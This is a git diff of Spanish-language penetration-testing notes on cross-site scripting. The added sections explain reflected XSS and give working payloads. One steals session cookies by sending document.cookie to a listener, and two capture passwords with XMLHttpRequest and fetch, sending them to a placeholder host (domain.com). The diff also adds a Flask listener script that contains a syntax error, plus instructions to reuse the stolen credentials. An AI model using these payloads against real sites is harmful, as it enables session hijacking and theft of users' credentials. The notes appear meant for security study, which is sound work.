@@ -21,10 +21,11 @@ url...)
 
 ### TIPOS COMUNES
 
-+ **REFLECTED**: El atacante puede ver una
-  reacción inmediata en respuesta a la
-inyección.
- 
++ **REFLECTED**: Un XSS reflejado ocurre cuando un input proporcionado
+  por el usuario se devuelve directamente en la respuesta de la web sin
+ser validado o escapado. Si ese input contiene código JavaScript, este
+se “refleja” en la página y se ejecuta en el navegador de la víctima.
+
 + **STORED**: El payload malicioso queda
   almacenado en la base de datos o en el
 servidor. Cuando un usuario accede a la
@@ -129,17 +130,111 @@ Hasta ahora hemos visto diferentes maneras de lanzar ataques XSS.
 Ahora vamos a ver como podemos aprovechar esta vulnerabilidad para
 escalarla hacía algo más.
 
-### EXPLOTANDO XSS PARA ROBAR COOKIS DE SESIÓN
+### EXPLOTANDO XSS PARA ROBAR COOKIS DE SESIÓN (cookie hijacking)
 
 Las cookies de sesión sirven para mantener identificado a un usuario en una sesión. Mediante un XSS podemos robar la cookie de sesión de un usuario legitimo, para hacernos pasar por él.
 Esto tiene una serie de limitaciones: 
     + El usuario no debe estar logeado
-    + La mayoría de aplicaciones esconden sus cookies de Js
-      mediante la flag HttpOnly.
+    + La mayoría de aplicaciones esconden sus cookies de Js mediante la
+      flag HttpOnly. (para hacer un diagnostico de esto, puedes mirar en
+las herramientas del desarrollador > Storage y observar si la flag
+HttpOnly esta en false.
     + Las sesiones podrían estar bloqueadas por factores
       adicionales, como las dirección IP del usuario. 
     + La sesión podría expirar antes de que puedas interceptarla.
-  
+
+**SITUACIÓN INCIAL** 
+Nos encontramos ante un input vulnerable a un XSS. 
+Probamos un simple: 
+```js
+<script>alert('XSS');</script>
+```
+Y vemos que este se "refleja" en la web. ¿Cómo podemos aprovechar esta
+vulnerabilidad para ganar acceso? ¿Cómo podemos sustraer una cookie de sesión a un usuario?
+Partimos de un **payload** básico:
+```js
+<script>alert(document.cookie);</script>
+``` 
+Este payload mostrara la cookie de sesión del usuario actual.
+Obviamente, si lo lanzamos nosotros mismos, nos mostrará nuestra propia
+cookie. Entonces, la idea principal es conseguir que un usuario ejecute
+dicho payload. ¿Pero cómo conseguimos que un usuario ejecute algo así?
+
+Antes de nada vamos a configurar un **listener** para recibir las cookies de la victima. Vamos a hacerlo mediante un script de Python. 
+```python
+from flask import Flask, request, url_for, render_template, redirect, make_response
+import requests
+
+app = Flask(__name__, static_url_path'=/static, static_folder='static')
+app.config['DEBUG'] = True
+
+@app.route("/<steal_cookie>", methods=['GET'])
+def start(steal_cookie):
+    return render_template("evil.html")
+
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=1337)
+```
+```bash
+sudo python3 listener.py
+``` 
+Ahora deberíamos conseguir que la victima ejecutará el siguiente
+**payload**: 
+```js
+<script>
+    new Image().src = "http://localhost:1337/?stolen_cookie=" + document.cookie;
+</script>
+```
+Ahora si la victima ejecuta dicho payload, a nosotros nos llegaría la cookie por el listener.
+Para realizar el cookie hijacking nos hemos de asegurar de que la victima ha hecho login out y copiar la session id en herramientas del desarrollador > Storage
+
+### EXPLOTANDO (BIND) XSS PARA CAPTURAR PASSWORDS 
+
+Podemos capturar la password de un usuario inyectando un payload en un
+comentario vulnerable y esperar que algún usuario interactue con el y lo
+ejecute. Seria algo así como "tender una trampa". Para este ejemplo
+tenemos dos opciones, un payload mediante XMLHttpRequest y otro mediante
+FetchAPI.
+
+**XMLHttpRequest PAYLOAD**
+```js
+<input name=username id=username>
+<input type=password name=password id=password onchange="Capture()">
+<script>
+function Capture()
+{
+var user = document.getElementById('username').value;
+var pass = document.getElementById('password').value;
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "https://domain.com/?username=" + user + "&password=" + pass, true)
+xhr.send();
+}
+</script>
+```
+
+**Fetch API PAYLOAD**
+```js
+<input name=username id=username>
+<input type=password name=password onchange="fetch('https://domain.com',
+{
+method:'POST',
+body:username.value+':'+this.value
+});">
+```
+Como **listener** podemos utilizar un simple servidor de python (deberemos establecer un tunel antes):
+```bash
+python3 -m http.server 8080
+``` 
+O podemos utilizar interactsh o el collaborator de burpsuite pro como métodos
+más sencillos.
+https://app.interactsh.com/#/ Obviamente deberemos cambiar el "https://domain.com" del payload por nuestra dirección.
+
+Así, cuando un usuario interactue con el comentario nosotros recibiremos
+la petición. Dicha petición contendrá las credenciales del usuario de
+forma: user:password. 
+
+Luego utilizaremos estas credenciales robadas para acceder.
+
 
 **XSS TO LFI (POR PROBAR)**
 
